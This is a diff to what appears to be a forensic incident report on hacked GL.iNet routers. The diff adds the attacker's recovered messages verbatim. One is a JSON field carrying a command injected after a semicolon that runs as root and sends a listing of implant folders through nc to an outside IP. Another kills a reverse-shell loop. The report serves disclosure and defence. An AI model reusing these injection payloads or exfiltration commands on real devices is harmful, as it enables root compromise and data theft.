@@ -246,8 +246,32 @@ these the client had run since boot and still held the message. It is the same o
 from a device identifier. What the appended command does: it lists the folders `/etc/config/.gl`
 and `/etc/glinet/.cache`, which belong to the KVM implant called "gl-helper"
 ([kvm-firmware.md](kvm-firmware.md)), tags the listing with the device identifier and sends it
-to `170.39.226.219`. It installs nothing. We do not print the message. Another owner recovered
-the same message from a GL-BE9300 (Reported).
+to `170.39.226.219`. It installs nothing. Another owner recovered the same message from a
+GL-BE9300 (Reported).
+
+The message, exactly as recovered (401 bytes). `<id>` stands for the router's own identifier,
+twelve hexadecimal characters in the form of a hardware address without separators; it is the
+only part that differs between the seven routers:
+
+```json
+{"id": 1, "astrowarp": {"virtual_ip_info": {"data": [{"mac": "", "virtualIp": "127.0.0.1", "ip": "127.0.0.1;(echo MKX<id>; echo \"===S===\"; ls -ld /etc/config/.gl 2>&1; echo \"===L===\"; ls -la /etc/config/.gl 2>&1 | head -40; echo \"===C===\"; ls -la /etc/glinet/.cache 2>&1 | head -20; echo \"LL<id>\n===E===\"; echo EE<id>) | nc 170.39.226.219 50000 >/dev/null 2>&1 &"}]}}}
+```
+
+Read as a command, after the handler has put the `ip` value into its `iptables` line, the part
+after the semicolon runs as root:
+
+```sh
+(echo MKX<id>; echo "===S==="; ls -ld /etc/config/.gl 2>&1; echo "===L==="; ls -la /etc/config/.gl 2>&1 | head -40; echo "===C==="; ls -la /etc/glinet/.cache 2>&1 | head -20; echo "LL<id>
+===E==="; echo EE<id>) | nc 170.39.226.219 50000 >/dev/null 2>&1 &
+```
+
+So what reached the attacker's port 50000 from each router was: a start marker with the
+router's identifier, the listing of the two implant folders (or the "No such file" errors),
+and two end markers. The `"id": 1` at the front is why the cloud's own log shows these replies
+with the number 1 where ordinary commands carry a 32-character id.
+
+On one of the seven the message had arrived in the client's encrypted message type and we
+decrypted it; on the other six it was in memory as plain text. The text is the same.
 
 On the routers where the call was recorded twice, we found this one text only. On one more router
 of the same batch the message was no longer in memory; on routers that had restarted nothing was
@@ -256,8 +280,18 @@ did with the answer, or whether a router that answered "the folders exist" was t
 something else.
 
 **3. A message that tried to end the shell.** On one GL-AXT1800 4.8.2 with live shells, the
-client's memory held one more `virtual_ip_info` message, built the same way. Its appended command
-calls `pkill -9 -f` to end, by name, the processes of the shell loop. `pkill` is not present on
+client's memory held one more `virtual_ip_info` message, built the same way (249 bytes, recovered
+by decrypting it):
+
+```json
+{"id": 1, "astrowarp": {"virtual_ip_info": {"data": [{"mac": "", "virtualIp": "127.0.0.1", "ip": "127.0.0.1;pkill -9 -f \"mkfifo /tmp/[f]\"; pkill -9 -f \"/tmp/.l[p]\"; pkill -9 -f \"cat /tmp/[f]\"; pkill -9 -f \"nc 170.39.226.21[9]\"; sleep 1"}]}}}
+```
+
+Its appended command calls `pkill -9 -f` four times to end, by name, the processes of the shell
+loop: the `mkfifo /tmp/f` loop, `cat /tmp/f`, the `nc` to the attacker's address, and anything
+whose command line contains `/tmp/.lp`. That last name is not one we have seen on a router; it
+suggests a further tool, or a variant of the shell that used a file of that name. The square
+brackets are the usual way to keep such a pattern from matching the `pkill` command itself. `pkill` is not present on
 GL-AXT1800 firmware 4.8.2, 4.8.3 or 4.8.4 (read on that router and on two of ours), so it ended
 nothing: the three shells were still running when we found them. It matches that router's last
 call, 22:14:38 on 20 November. The last calls on two other GL-AXT1800 routers fall at 22:14:17
